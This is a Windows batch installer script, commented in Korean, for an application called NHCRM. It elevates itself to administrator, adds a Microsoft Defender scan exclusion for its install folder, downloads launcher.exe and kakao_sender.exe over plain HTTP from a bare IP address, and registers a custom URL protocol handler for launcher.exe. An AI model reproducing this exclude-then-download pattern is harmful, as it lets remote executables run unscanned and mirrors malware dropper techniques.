@echo off

:: 현재 디렉터리 저장 (초기화)
set "CURRENT_DIR=%cd%"

:: 관리자 권한 확인
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList '%CURRENT_DIR%' -Verb RunAs"
    exit /b
)

:: 관리자 권한으로 실행된 경우
if "%~1"=="" goto :eof
cd /d "%~1"

setlocal

:: NHCRM 설치 경로
set "NH_DIR=%LOCALAPPDATA%\NHCRM"
set "LAUNCHER_URL=http://3.38.7.3:8000/static/download/launcher.exe"
set "SENDER_URL=http://3.38.7.3:8000/static/download/kakao_sender.exe"
set "LAUNCHER_EXE=%NH_DIR%\launcher.exe"
set "SENDER_EXE=%NH_DIR%\kakao_sender.exe"

:: 폴더 생성
if not exist "%NH_DIR%" mkdir "%NH_DIR%"

:: Defender 예외 등록
echo [보안] Defender 예외 등록 중...
powershell -Command "Add-MpPreference -ExclusionPath '%NH_DIR%'"

:: launcher.exe 다운로드
echo [다운로드] launcher.exe 다운로드 중...
powershell -Command "Invoke-WebRequest -Uri '%LAUNCHER_URL%' -OutFile '%LAUNCHER_EXE%'"

:: kakao_sender.exe 다운로드
echo [다운로드] kakao_sender.exe 다운로드 중...
powershell -Command "Invoke-WebRequest -Uri '%SENDER_URL%' -OutFile '%SENDER_EXE%'"

:: 탐색기 열기 (실행 제외)
if exist "%LAUNCHER_EXE%" (
    echo [완료] launcher.exe 다운로드 완료
    start "" explorer "%NH_DIR%"
) else (
    echo [실패] launcher.exe 다운로드 실패
)
:: 레지스트리 등록
echo [레지스트리 등록] 레지스트리 등록 중...
set "CMD_PATH=%NH_DIR%\launcher.exe"

reg add "HKCR\NHCRM" /ve /d "NHCRM Protocol" /f
reg add "HKCR\NHCRM\shell" /ve /d "" /f
reg add "HKCR\NHCRM\shell\open" /ve /d "" /f
reg add "HKCR\NHCRM\shell\open\command" /ve /d "\"%CMD_PATH%\" \"%%1\"" /f
reg add "HKCR\NHCRM" /v "URL Protocol" /d "" /f



pause
endlocal
